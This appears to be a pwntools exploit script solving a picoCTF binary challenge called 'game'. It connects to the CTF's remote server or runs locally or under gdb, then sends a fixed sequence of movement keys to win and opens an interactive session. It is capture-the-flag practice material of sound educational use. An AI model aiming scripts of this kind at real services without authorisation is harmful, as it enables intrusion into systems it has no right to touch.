#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./game"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 49736)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+234
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

for i in range(4):
    payload = b"w"
    p.recvuntil("." * 8)
    p.send(payload)

for i in range(8):
    payload = b"a"
    p.recvuntil("." * 8)
    p.send(payload)

payload = b"p"
p.recvuntil("." * 8)
p.send(payload)

p.interactive()
